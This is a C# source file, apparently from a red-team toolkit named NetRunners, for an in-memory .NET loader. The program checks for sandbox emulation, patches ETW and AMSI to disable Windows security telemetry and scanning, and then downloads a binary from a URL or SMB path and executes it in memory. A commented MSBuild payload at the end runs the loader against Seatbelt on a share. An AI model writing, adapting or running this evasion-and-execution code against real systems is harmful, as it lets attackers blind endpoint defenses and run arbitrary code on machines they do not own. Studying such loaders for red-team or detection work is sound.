using CommandLine;
using System;
using static NetRunners.Loader.Helpers.Helpers;
using static NetRunners.Patchers.Patcher;
using static NetRunners.Heuristics.Heuristics;

namespace NetRunners.Loader
{
    public class Options
    {
        [Option('p', "path", Required = true, HelpText = "URL of the binary to download and execute.")]
        public string path { get; set; }

        [Option('a', "args", Required = false, HelpText = "Optional arguments for the binary. Use \"=\" sign after -a/--args to escape special characters.")]
        public string binaryArguments { get; set; }
    }

    class Program
    {
        /// <summary>
        /// This program will load a .Net binary from a local filesystem path, UNC path (SMB) or URL and execute it in memory. 
        /// </summary>

        /// <example>
        /// Run shellcode runner in EntryPointStomping mode using Loader: C:\Temp\Loader.exe --path "C:\Temp\NetRunners.exe" --args="-eps"
        /// </example>

        /// <author>
        /// @gustanini
        /// </author>

        /// <see>
        /// https://linktr.ee/hackerhermanos
        /// </see>

        /// adapted from https://github.com/Flangvik/NetLoader
        static void Main(string[] args)
        {
            // bypass stuff
            if (!NonEmulated())
            {
                return;
            }
            // call patchers
            if ((!PatchEtw()) || (!PatchAmsi()))
                return;

            // Parse the command line arguments
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(o =>
                {
                    Console.WriteLine($"Path: {o.path}");

                    if (!string.IsNullOrEmpty(o.binaryArguments))
                    {
                        Console.WriteLine($"Binary Arguments: {o.binaryArguments}");
                    }

                    // get binary
                    byte[] binaryData = (o.path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
                        ? binaryData = DownloadBinary(o.path)
                        : binaryData = ReadFile(o.path);

                    if (binaryData != null)
                    {
                        // Load and execute the binary
                        ExecuteBinaryInMemory(binaryData, o.binaryArguments);
                    }
                    else
                    {
                        Console.WriteLine("[-] File could not be retrieved.");
                    }
                })
                .WithNotParsed<Options>(errs =>
                {
                    // display errors / invalid arguments
                    Console.WriteLine("Invalid arguments.");
                });
        }
    }
}

/* MSBuild payload

using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

   //This is for MSBuild later
  public class ClassExample : Task, ITask
  {
      public override bool Execute()
      {
          Loader.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
          return true;
      }
  }
*/